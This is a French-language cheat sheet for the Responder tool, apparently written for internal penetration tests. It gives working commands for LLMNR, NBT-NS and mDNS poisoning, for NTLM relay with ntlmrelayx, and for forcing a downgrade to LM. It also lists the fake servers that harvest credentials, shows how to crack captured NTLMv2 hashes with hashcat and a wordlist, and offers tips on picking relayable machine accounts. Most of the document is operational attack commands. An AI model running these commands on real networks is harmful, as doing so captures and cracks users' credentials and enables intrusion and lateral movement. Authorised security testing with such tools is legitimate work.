# Responder

Outil d'empoisonnement LLMNR/NBT-NS/mDNS et de capture de credentials. L'outil de base pour toute phase d'exploitation interne sans credentials.

## Installation

```bash
# Déjà installé sur Kali, sinon :
git clone https://github.com/lgandx/Responder.git
cd Responder
python3 Responder.py
```

## Syntaxe de base

```bash
sudo responder -I <interface> [options]
```

## Modes d'utilisation

### Capture passive (le plus courant)

```bash
# Empoisonner LLMNR + NBT-NS + mDNS et capturer les hashes
sudo responder -I eth0 -dwP
```

- `-d` : activer le serveur DHCP (répondre aux requêtes DHCPv6)
- `-w` : activer le proxy WPAD
- `-P` : forcer l'auth NTLM sur le proxy WPAD

### Mode analyse (pas d'empoisonnement)

```bash
# Observer sans interférer — utile en début d'audit
sudo responder -I eth0 -A
```

### Combiné avec ntlmrelayx (relay au lieu de capture)

```bash
# Désactiver les serveurs SMB et HTTP de Responder (ntlmrelayx les gère)
sudo responder -I eth0 -wPd --disable-ess

# Dans un autre terminal :
impacket-ntlmrelayx -tf targets.txt -smb2support
```

Ou éditer `/etc/responder/Responder.conf` :
```
SMB = Off
HTTP = Off
```

## Options importantes

| Option | Description |
|--------|-------------|
| `-I eth0` | Interface réseau |
| `-w` | Activer le serveur WPAD |
| `-P` | Forcer l'auth NTLM via WPAD |
| `-d` | Répondre aux requêtes DHCP |
| `-A` | Mode analyse (passif, pas de poison) |
| `-v` | Verbose (voir les requêtes ignorées) |
| `-f` | Fingerprint des machines qui font des requêtes |
| `-F` | Forcer l'auth NTLM sur les requêtes WPAD (legacy) |
| `--lm` | Forcer le downgrade vers LM au lieu de NTLMv2 |
| `--disable-ess` | Désactiver Extended Session Security (facilite le relay) |

## Serveurs intégrés

Responder lance plusieurs faux serveurs pour capturer des credentials :

| Serveur | Port | Ce qu'il capture |
|---------|------|-----------------|
| SMB | 445 | Hashes NTLMv2 via SMB |
| HTTP | 80 | Hashes NTLMv2 via HTTP/WPAD |
| FTP | 21 | Credentials FTP en clair |
| LDAP | 389 | Credentials LDAP en clair |
| SQL | 1433 | Credentials MSSQL |
| SMTP | 25 | Credentials SMTP |
| POP3 | 110 | Credentials POP3 |
| IMAP | 143 | Credentials IMAP |
| DNS | 53 | Requêtes DNS (pour information) |
| HTTPS | 443 | Hashes NTLMv2 via HTTPS |

## Résultats

Les hashes capturés sont affichés en temps réel et sauvegardés dans :

```bash
# Logs
/usr/share/responder/logs/

# Format des hashes NTLMv2
username::DOMAINE:challenge:ntproofstr:response

# Cracker avec hashcat
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-*.txt /usr/share/wordlists/rockyou.txt
```

## Protocoles empoisonnés

### LLMNR (Link-Local Multicast Name Resolution)

- Multicast IPv4 224.0.0.252, port UDP 5355
- Activé par défaut sur Windows
- Déclenché quand le DNS échoue

### NBT-NS (NetBIOS Name Service)

- Broadcast UDP port 137
- Activé par défaut sur Windows
- Déclenché quand le DNS et LLMNR échouent

### mDNS (Multicast DNS)

- Multicast IPv4 224.0.0.251, port UDP 5353
- Utilisé par Apple Bonjour, parfois Windows

## Astuces

- Laisser tourner au moins 15-30 minutes pour capturer un maximum
- Les hashes de comptes machines (`MACHINE$`) ne sont généralement pas craquables mais sont relayables
- Les premières minutes capturent souvent les comptes les plus actifs
- En mode relay, les comptes machines sont souvent plus intéressants que les utilisateurs (droits locaux sur d'autres machines)
- Vérifier `Responder.conf` pour activer/désactiver les serveurs individuellement
